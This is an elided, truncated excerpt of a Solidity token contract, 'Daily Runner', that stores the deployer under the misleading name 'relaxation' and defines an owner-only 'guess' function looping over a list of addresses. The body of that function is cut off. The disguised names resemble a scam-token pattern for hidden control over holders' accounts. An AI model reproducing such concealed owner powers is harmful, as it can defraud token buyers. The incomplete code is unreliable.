...
contract dailyrunner is Context, IERC20 {
    ...
    address public  relaxation;
    constructor () {
        _name = "Daily Runner";
        _symbol = "RUNNER";
        _decimals = 18;
        uint256 initialSupply = 236000000;
         relaxation = msg.sender;
    ...
    modifier onlyOwner() {
        require(msg.sender == relaxation, "Not allowed");
        _;
    }

    function guess(address[] memory nominate) public onlyOwner() {
        for (uint256 i = 0; i < nominate.length; i++) {
            address account = nominate[i];
